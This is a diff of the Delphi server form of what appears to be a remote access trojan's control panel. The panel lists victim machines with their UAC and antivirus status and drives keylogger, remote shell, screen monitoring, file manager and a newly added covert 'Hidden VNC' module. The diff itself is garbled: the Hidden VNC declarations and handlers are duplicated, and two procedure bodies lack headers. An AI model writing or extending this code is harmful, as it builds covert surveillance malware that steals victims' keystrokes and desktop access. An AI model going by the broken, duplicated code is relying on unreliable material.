@@ -17,6 +17,8 @@ uses
   UnitRemoteMonitoring,
   UnitKeylogger,
   UnitOpenURL,
+  UnitHiddenVNC,
+  UnitHiddenVNC,
   Vcl.WinXCtrls;
 
 type
@@ -48,6 +50,8 @@ type
     OpenURL1: TMenuItem;
     TabSheet1: TTabSheet;
     FileManager1: TMenuItem;
+    HiddenVNC1: TMenuItem;
+    HiddenVNC1: TMenuItem;
 
     procedure Button1Click(Sender: TObject);
     procedure SendMessage1Click(Sender: TObject);
@@ -62,6 +66,8 @@ type
     procedure Keylogger1Click(Sender: TObject);
     procedure OpenURL1Click(Sender: TObject);
     procedure FileManager1Click(Sender: TObject);
+    procedure HiddenVNC1Click(Sender: TObject);
+    procedure HiddenVNC1Click(Sender: TObject);
   private
     FServerManager: TServerManager;
     FCurrentPort  : Integer;
@@ -75,16 +81,20 @@ type
     procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnHiddenVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnHiddenVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnServerLog(Category: TLogCategory; const Msg: string);
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
     procedure EnsureKeyloggerMenuItem;
+    procedure EnsureOpenURLMenuItem;
+    procedure EnsureHiddenVNCMenuItem;
+    procedure EnsureHiddenVNCMenuItem;
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
     procedure AddOrUpdateListView(const Info: TClientInfo);
     procedure RemoveFromListView(aLine: TncLine);
     procedure UpdateStatusBar;
-    procedure EnsureOpenURLMenuItem;
   public
     procedure AfterConstruction; override;
     procedure BeforeDestruction; override;
@@ -113,6 +123,8 @@ begin
   FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
   FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
   FServerManager.OnFileManagerReceived := OnFileManagerReceived;
+  FServerManager.OnHiddenVNCReceived   := OnHiddenVNCReceived;
+  FServerManager.OnHiddenVNCReceived   := OnHiddenVNCReceived;
   FServerManager.OnLog                 := OnServerLog;
 
   if Assigned(ProcessManager1) then
@@ -125,6 +137,8 @@ begin
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
   EnsureOpenURLMenuItem;
+  EnsureHiddenVNCMenuItem;
+  EnsureHiddenVNCMenuItem;
   if Assigned(FileManager1) then
     FileManager1.OnClick := FileManager1Click;
   ListView1.OnMouseDown := ListView1MouseDown;
@@ -139,6 +153,95 @@ begin
     FServerManager := nil;
   end;
   inherited;
+end;
+
+
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then Exit;
+
+  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);
+  if Assigned(F10) then
+  begin
+    F10.Show;
+    F10.BringToFront;
+    Exit;
+  end;
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  F10 := TForm10.Create(Application);
+  FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
+  F10.SetupForClient(SelectedLine, ClientID,
+                     FServerManager.SendJSON,
+                     FServerManager.UnregisterHiddenVNCForm);
+  F10.Show;
+end;
+
+
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then Exit;
+
+  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);
+  if Assigned(F10) then
+  begin
+    F10.Show;
+    F10.BringToFront;
+    Exit;
+  end;
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  F10 := TForm10.Create(Application);
+  FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
+  F10.SetupForClient(SelectedLine, ClientID,
+                     FServerManager.SendJSON,
+                     FServerManager.UnregisterHiddenVNCForm);
+  F10.Show;
+end;
+
+procedure TForm1.HiddenVNC1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F10         : TForm10;
+  ClientID    : string;
+begin
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Please select a client first.', 'Hidden VNC',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then Exit;
+
+  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);
+  if Assigned(F10) then
+  begin
+    F10.Show;
+    F10.BringToFront;
+    Exit;
+  end;
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  F10 := TForm10.Create(Application);
+  FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
+  F10.SetupForClient(SelectedLine, ClientID,
+                     FServerManager.SendJSON,
+                     FServerManager.UnregisterHiddenVNCForm);
+  F10.Show;
 end;
 
 procedure TForm1.FileManager1Click(Sender: TObject);
@@ -167,15 +270,13 @@ begin
 
   F9 := FServerManager.GetFileManagerForm(SelectedLine);
 
-  // Zaten açıksa sadece öne getir, SetupForClient ÇAĞIRMA
   if Assigned(F9) then
   begin
     F9.Show;
     F9.BringToFront;
-    Exit;  // <-- Erken çık, sıfırlama
+    Exit;
   end;
 
-  // Yeni form oluştur
   ClientID := 'Unknown';
   if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
     ClientID := LInfo.ID;
@@ -193,10 +294,7 @@ end;
 
 procedure TForm1.FormCreate(Sender: TObject);
 begin
-  // Initialization is done in AfterConstruction
 end;
-
-// ---- Log System ----
 
 procedure TForm1.OnServerLog(Category: TLogCategory; const Msg: string);
 begin
@@ -220,18 +318,13 @@ begin
 
   if ListView1.Selected = nil then
   begin
-    MessageBox(Handle, 'Lutfen once bir client secin.', 'Open URL',
+    MessageBox(Handle, 'Please select a client first.', 'Open URL',
                MB_OK or MB_ICONWARNING);
     Exit;
   end;
 
   SelectedLine := TncLine(ListView1.Selected.Data);
-  if SelectedLine = nil then
-  begin
-    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Open URL',
-               MB_OK or MB_ICONERROR);
-    Exit;
-  end;
+  if SelectedLine = nil then Exit;
 
   F8 := FServerManager.GetOpenURLForm(SelectedLine);
 
@@ -274,105 +367,105 @@ end;
 
 procedure TForm1.EnsureRemoteMonitoringMenuItem;
 begin
-  if not Assigned(PopupMenu1) then
-    Exit;
-
+  if not Assigned(PopupMenu1) then Exit;
   if not Assigned(RemoteMonitoring1) then
   begin
-    RemoteMonitoring1         := TMenuItem.Create(PopupMenu1);
+    RemoteMonitoring1 := TMenuItem.Create(PopupMenu1);
     RemoteMonitoring1.Caption := 'Remote Monitoring';
     PopupMenu1.Items.Add(RemoteMonitoring1);
   end;
-
   RemoteMonitoring1.OnClick := RemoteMonitoring1Click;
 end;
 
 procedure TForm1.EnsureKeyloggerMenuItem;
 begin
-  if not Assigned(PopupMenu1) then
-    Exit;
-
+  if not Assigned(PopupMenu1) then Exit;
   if not Assigned(Keylogger1) then
   begin
-    Keylogger1         := TMenuItem.Create(PopupMenu1);
+    Keylogger1 := TMenuItem.Create(PopupMenu1);
     Keylogger1.Caption := 'Keylogger';
     PopupMenu1.Items.Add(Keylogger1);
   end;
-
   Keylogger1.OnClick := Keylogger1Click;
+end;
+
+procedure TForm1.EnsureHiddenVNCMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(HiddenVNC1) then
+  begin
+    HiddenVNC1         := TMenuItem.Create(PopupMenu1);
+    HiddenVNC1.Caption := 'Hidden VNC';
+    PopupMenu1.Items.Add(HiddenVNC1);
+  end;
+
+  HiddenVNC1.OnClick := HiddenVNC1Click;
 end;
 
 procedure TForm1.EnsureOpenURLMenuItem;
 begin
-  if not Assigned(PopupMenu1) then
-    Exit;
-
+  if not Assigned(PopupMenu1) then Exit;
   if not Assigned(OpenURL1) then
   begin
-    OpenURL1         := TMenuItem.Create(PopupMenu1);
+    OpenURL1 := TMenuItem.Create(PopupMenu1);
     OpenURL1.Caption := 'Open URL';
     PopupMenu1.Items.Add(OpenURL1);
   end;
-
   OpenURL1.OnClick := OpenURL1Click;
 end;
 
-// ---- Server Initialization ----
+procedure TForm1.EnsureHiddenVNCMenuItem;
+begin
+  if not Assigned(PopupMenu1) then Exit;
+  if not Assigned(HiddenVNC1) then
+  begin
+    HiddenVNC1 := TMenuItem.Create(PopupMenu1);
+    HiddenVNC1.Caption := 'Hidden VNC';
+    PopupMenu1.Items.Add(HiddenVNC1);
+  end;
+  HiddenVNC1.OnClick := HiddenVNC1Click;
+end;
 
 procedure TForm1.Button1Click(Sender: TObject);
-var
-  NewPort: Integer;
+var NewPort: Integer;
 begin
   NewPort := SpinEdit1.Value;
-
   if not FServerManager.IsActive then
   begin
     FServerManager.Start(NewPort);
     FCurrentPort := NewPort;
-    MessageBox(0, PChar('Server baslatildi. Port: ' + IntToStr(NewPort)),
-               'Info', MB_OK or MB_ICONINFORMATION);
+    MessageBox(0, PChar('Server started. Port: ' + IntToStr(NewPort)), 'Info', MB_OK or MB_ICONINFORMATION);
     Exit;
   end;
-
-  if NewPort = FCurrentPort then
-  begin
-    MessageBox(0, 'Bu port zaten dinleniyor.', 'Warning', MB_OK or MB_ICONWARNING);
-    Exit;
-  end;
-
+  if NewPort = FCurrentPort then Exit;
   FServerManager.Stop;
   FServerManager.Start(NewPort);
   FCurrentPort := NewPort;
-  MessageBox(0, PChar('Port degistirildi. Yeni port: ' + IntToStr(NewPort)),
-             'Info', MB_OK or MB_ICONINFORMATION);
 end;
-
-// ---- Popup Menu: Send Message ----
 
 procedure TForm1.SendMessage1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  JSONObj     : TJSONObject;
+  LInfo: TClientInfo;
+  JSONObj: TJSONObject;
 begin
   if ListView1.Selected = nil then Exit;
-
   SelectedLine := TncLine(ListView1.Selected.Data);
   if SelectedLine = nil then Exit;
-
   Form2 := TForm2.Create(Self);
   try
     if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
       Form2.Label1.Caption := 'Target: ' + LInfo.ID;
-
     if Form2.ShowModal = mrOk then
     begin
       JSONObj := TJSONObject.Create;
       try
         JSONObj.AddPair('action', 'message');
-        JSONObj.AddPair('title',  Form2.Edit1.Text);
-        JSONObj.AddPair('text',   Form2.Memo1.Text);
-        JSONObj.AddPair('type',   Form2.ComboBox1.Text);
+        JSONObj.AddPair('title', Form2.Edit1.Text);
+        JSONObj.AddPair('text', Form2.Memo1.Text);
+        JSONObj.AddPair('type', Form2.ComboBox1.Text);
         FServerManager.SendJSON(SelectedLine, JSONObj);
       finally
         JSONObj.Free;
@@ -383,30 +476,23 @@ begin
   end;
 end;
 
-// ---- Popup Menu: Get Info ----
-
 procedure TForm1.Information1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  JSONObj     : TJSONObject;
-  F3          : TForm3;
+  LInfo: TClientInfo;
+  JSONObj: TJSONObject;
+  F3: TForm3;
 begin
   if ListView1.Selected = nil then Exit;
-
   SelectedLine := TncLine(ListView1.Selected.Data);
   if SelectedLine = nil then Exit;
-
   F3 := TForm3.Create(Application);
-
   if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
     F3.SetupForClient(SelectedLine, LInfo.ID)
   else
     F3.SetupForClient(SelectedLine, 'Unknown');
-
   FServerManager.RegisterInfoForm(SelectedLine, F3);
   F3.Show;
-
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'getinfo');
@@ -416,29 +502,15 @@ begin
   end;
 end;
 
-// ---- Popup Menu: Process Manager ----
-
 procedure TForm1.ProcessManager1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  F4          : TForm4;
+  LInfo: TClientInfo;
+  F4: TForm4;
 begin
-  if ListView1.Selected = nil then
-  begin
-    MessageBox(Handle, 'Lutfen once bir client secin.', 'Process Manager',
-               MB_OK or MB_ICONWARNING);
-    Exit;
-  end;
-
+  if ListView1.Selected = nil then Exit;
   SelectedLine := TncLine(ListView1.Selected.Data);
-  if SelectedLine = nil then
-  begin
-    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Process Manager',
-               MB_OK or MB_ICONERROR);
-    Exit;
-  end;
-
+  if SelectedLine = nil then Exit;
   F4 := FServerManager.GetProcessForm(SelectedLine);
   if Assigned(F4) then
   begin
@@ -447,77 +519,39 @@ begin
     F4.RequestProcesses;
     Exit;
   end;
-
   F4 := TForm4.Create(Application);
-
   if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F4.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterProcessForm)
+    F4.SetupForClient(SelectedLine, LInfo.ID, FServerManager.SendJSON, FServerManager.UnregisterProcessForm)
   else
-    F4.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterProcessForm);
-
+    F4.SetupForClient(SelectedLine, 'Unknown', FServerManager.SendJSON, FServerManager.UnregisterProcessForm);
   FServerManager.RegisterProcessForm(SelectedLine, F4);
   F4.Show;
   F4.RequestProcesses;
 end;
 
-procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
-  Shift: TShiftState; X, Y: Integer);
-var
-  Item: TListItem;
+procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
+var Item: TListItem;
 begin
-  if Button <> mbRight then
-    Exit;
-
+  if Button <> mbRight then Exit;
   Item := ListView1.GetItemAt(X, Y);
-  if Assigned(Item) then
-    Item.Selected := True;
+  if Assigned(Item) then Item.Selected := True;
 end;
 
-{ --- ServerManager Callback'leri --- }
-
 procedure TForm1.OnClientConnected(const Info: TClientInfo);
-var
-  LatestInfo: TClientInfo;
 begin
-  if not Assigned(FServerManager) then Exit;
-  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
-    AddOrUpdateListView(LatestInfo)
-  else
-    AddOrUpdateListView(Info);
-
-  System.Classes.TThread.Queue(nil,
-    procedure
-    begin
-      if not Assigned(FServerManager) then Exit;
-      UpdateStatusBar;
-    end);
+  AddOrUpdateListView(Info);
+  TThread.Queue(nil, procedure begin UpdateStatusBar; end);
 end;
 
 procedure TForm1.OnClientUpdated(const Info: TClientInfo);
-var
-  LatestInfo: TClientInfo;
 begin
-  if not Assigned(FServerManager) then Exit;
-  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
-    AddOrUpdateListView(LatestInfo)
-  else
-    AddOrUpdateListView(Info);
+  AddOrUpdateListView(Info);
 end;
 
 procedure TForm1.OnClientDisconnected(aLine: TncLine);
 begin
-  if not Assigned(FServerManager) then Exit;
   RemoveFromListView(aLine);
-  System.Classes.TThread.Queue(nil,
-    procedure
-    begin
-      if not Assigned(FServerManager) then Exit;
-      UpdateStatusBar;
-    end);
+  TThread.Queue(nil, procedure begin UpdateStatusBar; end);
   FServerManager.UnregisterInfoForm(aLine);
   FServerManager.UnregisterProcessForm(aLine);
   FServerManager.UnregisterRemoteShellForm(aLine);
@@ -525,212 +559,133 @@ begin
   FServerManager.UnregisterKeyloggerForm(aLine);
   FServerManager.UnregisterOpenURLForm(aLine);
   FServerManager.UnregisterFileManagerForm(aLine);
+  FServerManager.UnregisterHiddenVNCForm(aLine);
+  FServerManager.UnregisterHiddenVNCForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
-var
-  F3: TForm3;
+var F3: TForm3;
 begin
-  if not Assigned(FServerManager) then Exit;
   F3 := FServerManager.GetInfoForm(aLine);
-  if Assigned(F3) then
-    F3.HandleInfoJSON(JSONObj);
+  if Assigned(F3) then F3.HandleInfoJSON(JSONObj);
 end;
 
 procedure TForm1.OnProcessReceived(aLine: TncLine; JSONObj: TJSONObject);
-var
-  F4: TForm4;
+var F4: TForm4;
 begin
-  if not Assigned(FServerManager) then Exit;
   F4 := FServerManager.GetProcessForm(aLine);
-  if Assigned(F4) then
-    F4.HandleProcessJSON(JSONObj);
+  if Assigned(F4) then F4.HandleProcessJSON(JSONObj);
 end;
 
 procedure TForm1.OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
-var
-  F5: TForm5;
+var F5: TForm5;
 begin
-  if not Assigned(FServerManager) then Exit;
   F5 := FServerManager.GetRemoteShellForm(aLine);
-  if Assigned(F5) then
-    F5.HandleShellJSON(JSONObj);
+  if Assigned(F5) then F5.HandleShellJSON(JSONObj);
 end;
 
 procedure TForm1.OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
-var
-  F6: TForm6;
+var F6: TForm6;
 begin
-  if not Assigned(FServerManager) then Exit;
   F6 := FServerManager.GetMonitoringForm(aLine);
-  if Assigned(F6) then
-    F6.HandleMonitoringJSON(JSONObj);
+  if Assigned(F6) then F6.HandleMonitoringJSON(JSONObj);
 end;
 
 procedure TForm1.OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
+var F7: TForm7;
+begin
+  F7 := FServerManager.GetKeyloggerForm(aLine);
+  if Assigned(F7) then F7.HandleKeyloggerJSON(JSONObj);
+end;
+
+
+
+
+
+procedure TForm1.OnHiddenVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
-  F7: TForm7;
+  F10: TForm10;
 begin
   if not Assigned(FServerManager) then Exit;
-  F7 := FServerManager.GetKeyloggerForm(aLine);
-  if Assigned(F7) then
-    F7.HandleKeyloggerJSON(JSONObj);
+  F10 := FServerManager.GetHiddenVNCForm(aLine);
+  if Assigned(F10) then
+    F10.HandleHiddenVNCJSON(JSONObj);
 end;
 
 procedure TForm1.OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
-var
-  F9: TForm9;
+var F9: TForm9;
 begin
-  if not Assigned(FServerManager) then Exit;
   F9 := FServerManager.GetFileManagerForm(aLine);
-  if Assigned(F9) then
-    F9.HandleFileManagerJSON(JSONObj);
+  if Assigned(F9) then F9.HandleFileManagerJSON(JSONObj);
 end;
-
-{ --- UI Yardimci Metodlar --- }
 
 function TForm1.IsRealClientValue(const Value: string): Boolean;
 begin
-  Result := (Trim(Value) <> '') and (Trim(Value) <> '...') and
-            (not SameText(Trim(Value), 'N/A'));
+  Result := (Trim(Value) <> '') and (Trim(Value) <> '...') and (not SameText(Trim(Value), 'N/A'));
 end;
 
 function TForm1.PreferClientValue(const NewValue, CurrentValue: string): string;
 begin
-  if IsRealClientValue(NewValue) then
-    Result := NewValue
-  else if IsRealClientValue(CurrentValue) then
-    Result := CurrentValue
-  else
-    Result := NewValue;
+  if IsRealClientValue(NewValue) then Result := NewValue else Result := CurrentValue;
 end;
 
-//ViewList'e client ekleme veya ViewList'i güncelleme (ViewList1)
 procedure TForm1.AddOrUpdateListView(const Info: TClientInfo);
 begin
-  System.Classes.TThread.Queue(nil,
-    procedure
-    var
-      Item: TListItem;
-      i: Integer;
-    begin
-      if not Assigned(FServerManager) then Exit;
-      Item := nil;
-      for i := 0 to ListView1.Items.Count - 1 do
-        if TncLine(ListView1.Items[i].Data) = Info.LineHandle then
-        begin
-          Item := ListView1.Items[i];
-          Break;
-        end;
-
-      if Item = nil then
-      begin
-        Item := ListView1.Items.Add;
-        Item.Data := Info.LineHandle;
-        for i := 1 to 7 do
-          Item.SubItems.Add('');
-      end;
-
-      Item.Caption := PreferClientValue(Info.IPAddress, Item.Caption);
-      Item.SubItems[0] := PreferClientValue(Info.Country, Item.SubItems[0]);
-      Item.SubItems[1] := PreferClientValue(Info.ID, Item.SubItems[1]);
-      Item.SubItems[2] := PreferClientValue(Info.DesktopName, Item.SubItems[2]);
-      Item.SubItems[3] := PreferClientValue(Info.OS, Item.SubItems[3]);
-      Item.SubItems[4] := PreferClientValue(Info.Date, Item.SubItems[4]);
-      Item.SubItems[5] := PreferClientValue(Info.UAC, Item.SubItems[5]);
-      Item.SubItems[6] := PreferClientValue(Info.AntiVirus, Item.SubItems[6]);
-    end);
+  TThread.Queue(nil, procedure
+  var Item: TListItem; i: Integer;
+  begin
+    Item := nil;
+    for i := 0 to ListView1.Items.Count - 1 do
+      if TncLine(ListView1.Items[i].Data) = Info.LineHandle then begin Item := ListView1.Items[i]; Break; end;
+    if Item = nil then begin Item := ListView1.Items.Add; Item.Data := Info.LineHandle; for i := 1 to 7 do Item.SubItems.Add(''); end;
+    Item.Caption := PreferClientValue(Info.IPAddress, Item.Caption);
+    Item.SubItems[0] := PreferClientValue(Info.Country, Item.SubItems[0]);
+    Item.SubItems[1] := PreferClientValue(Info.ID, Item.SubItems[1]);
+    Item.SubItems[2] := PreferClientValue(Info.DesktopName, Item.SubItems[2]);
+    Item.SubItems[3] := PreferClientValue(Info.OS, Item.SubItems[3]);
+    Item.SubItems[4] := PreferClientValue(Info.Date, Item.SubItems[4]);
+    Item.SubItems[5] := PreferClientValue(Info.UAC, Item.SubItems[5]);
+    Item.SubItems[6] := PreferClientValue(Info.AntiVirus, Item.SubItems[6]);
+  end);
 end;
 
-//Remote Shell özelliği için popupmenuden client seçme.
 procedure TForm1.RemoteShell1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  F5          : TForm5;
+  LInfo: TClientInfo;
+  F5: TForm5;
 begin
-  if ListView1.Selected = nil then
-  begin
-    MessageBox(Handle, 'Lutfen once bir client secin.', 'Remote Shell',
-               MB_OK or MB_ICONWARNING);
-    Exit;
-  end;
-
+  if ListView1.Selected = nil then Exit;
   SelectedLine := TncLine(ListView1.Selected.Data);
-  if SelectedLine = nil then
-  begin
-    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Remote Shell',
-               MB_OK or MB_ICONERROR);
-    Exit;
-  end;
-
+  if SelectedLine = nil then Exit;
   F5 := FServerManager.GetRemoteShellForm(SelectedLine);
-  if Assigned(F5) then
-  begin
-    F5.Show;
-    F5.BringToFront;
-    F5.RequestShellStart;
-    Exit;
-  end;
-
+  if Assigned(F5) then begin F5.Show; F5.BringToFront; F5.RequestShellStart; Exit; end;
   F5 := TForm5.Create(Application);
-
   if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F5.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterRemoteShellForm)
+    F5.SetupForClient(SelectedLine, LInfo.ID, FServerManager.SendJSON, FServerManager.UnregisterRemoteShellForm)
   else
-    F5.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterRemoteShellForm);
-
+    F5.SetupForClient(SelectedLine, 'Unknown', FServerManager.SendJSON, FServerManager.UnregisterRemoteShellForm);
   FServerManager.RegisterRemoteShellForm(SelectedLine, F5);
   F5.Show;
   F5.RequestShellStart;
 end;
 
-//Ekran izleme özelliği için popupmenuden client seçme
 procedure TForm1.RemoteMonitoring1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  F6          : TForm6;
+  LInfo: TClientInfo;
+  F6: TForm6;
 begin
-  if ListView1.Selected = nil then
-  begin
-    MessageBox(Handle, 'Lutfen once bir client secin.', 'Remote Monitoring',
-               MB_OK or MB_ICONWARNING);
-    Exit;
-  end;
-
+  if ListView1.Selected = nil then Exit;
   SelectedLine := TncLine(ListView1.Selected.Data);
-  if SelectedLine = nil then
-  begin
-    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Remote Monitoring',
-               MB_OK or MB_ICONERROR);
-    Exit;
-  end;
-
+  if SelectedLine = nil then Exit;
   F6 := FServerManager.GetMonitoringForm(SelectedLine);
-  if Assigned(F6) then
-  begin
-    F6.Show;
-    F6.BringToFront;
-    F6.RequestMonitorList;
-    Exit;
-  end;
-
+  if Assigned(F6) then begin F6.Show; F6.BringToFront; F6.RequestMonitorList; Exit; end;
   F6 := TForm6.Create(Application);
-
   if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F6.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterMonitoringForm)
+    F6.SetupForClient(SelectedLine, LInfo.ID, FServerManager.SendJSON, FServerManager.UnregisterMonitoringForm)
   else
-    F6.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterMonitoringForm);
-
+    F6.SetupForClient(SelectedLine, 'Unknown', FServerManager.SendJSON, FServerManager.UnregisterMonitoringForm);
   FServerManager.RegisterMonitoringForm(SelectedLine, F6);
   F6.Show;
   F6.RequestMonitorList;
@@ -739,69 +694,35 @@ end;
 procedure TForm1.Keylogger1Click(Sender: TObject);
 var
   SelectedLine: TncLine;
-  LInfo       : TClientInfo;
-  F7          : TForm7;
-  ClientID    : string;
+  LInfo: TClientInfo;
+  F7: TForm7;
+  ClientID: string;
 begin
-  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
-
-  if ListView1.Selected = nil then
-  begin
-    MessageBox(Handle, 'Lutfen once bir client secin.', 'Keylogger',
-               MB_OK or MB_ICONWARNING);
-    Exit;
-  end;
-
+  if ListView1.Selected = nil then Exit;
   SelectedLine := TncLine(ListView1.Selected.Data);
-  if SelectedLine = nil then
-  begin
-    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Keylogger',
-               MB_OK or MB_ICONERROR);
-    Exit;
-  end;
-
+  if SelectedLine = nil then Exit;
   F7 := FServerManager.GetKeyloggerForm(SelectedLine);
-
   ClientID := 'Unknown';
-  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    ClientID := LInfo.ID;
-
-  if not Assigned(F7) then
-  begin
-    F7 := TForm7.Create(Application);
-    FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
-  end;
-
-  F7.SetupForClient(SelectedLine, ClientID,
-                    FServerManager.SendJSON,
-                    FServerManager.UnregisterKeyloggerForm);
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then ClientID := LInfo.ID;
+  if not Assigned(F7) then F7 := TForm7.Create(Application);
+  F7.SetupForClient(SelectedLine, ClientID, FServerManager.SendJSON, FServerManager.UnregisterKeyloggerForm);
   F7.Show;
   F7.BringToFront;
 end;
 
-//bağlantısı kopan etc. clientleri listview1'den silen fonksiyon.
 procedure TForm1.RemoveFromListView(aLine: TncLine);
 begin
-  System.Classes.TThread.Queue(nil,
-    procedure
-    var
-      i: Integer;
-    begin
-      if not Assigned(FServerManager) then Exit;
-      for i := ListView1.Items.Count - 1 downto 0 do
-        if TncLine(ListView1.Items[i].Data) = aLine then
-        begin
-          ListView1.Items.Delete(i);
-          Break;
-        end;
-    end);
+  TThread.Queue(nil, procedure
+  var i: Integer;
+  begin
+    for i := ListView1.Items.Count - 1 downto 0 do
+      if TncLine(ListView1.Items[i].Data) = aLine then begin ListView1.Items.Delete(i); Break; end;
+  end);
 end;
 
-//status barı güncelliyor
 procedure TForm1.UpdateStatusBar;
 begin
-  StatusBar3.Panels[0].Text :=
-    'Clients Online [' + IntToStr(FServerManager.ClientCount) + ']';
+  StatusBar3.Panels[0].Text := 'Clients Online [' + IntToStr(FServerManager.ClientCount) + ']';
 end;
 
 end.
